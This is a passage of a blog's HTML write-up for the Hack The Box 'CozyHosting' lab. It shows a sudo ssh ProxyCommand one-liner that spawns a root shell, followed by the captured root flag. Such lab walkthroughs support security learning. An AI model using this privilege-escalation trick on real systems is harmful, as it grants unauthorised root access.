+<figure><p><a href="https://gtfobins.github.io/gtfobins/ssh/#sudo" target="_blank" rel="noopener noreferrer">ssh | GTFOBins</a> - It can be used to break out from restricted environments by spawning an interactive system shell.</p></figure>
+
+<pre><code>ssh josh@10.10.11.230</code></pre>
+
+<ol><li>Check sudo permissions for the user john<pre><code>josh@cozyhosting:/usr/share/keyrings$ sudo -l
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *</code></pre><p>→ seems like ssh is allowed as root</p></li>
+<li>Some oneliner exploit that can be found online abuses this<pre><code>sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
+
+# cat root.txt
+141f30f55bed0cf1c9165cd86f5dd90c</code></pre><p>flag → <mark class="highlight-teal" data-notion-highlight="teal"><strong>141f30f55bed0cf1c9165cd86f5dd90c</strong></mark></p></li></ol>
+
+<figure><img src="../assets/images/htb/cozyhosting/05-untitled-4.png" alt=""></figure>
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
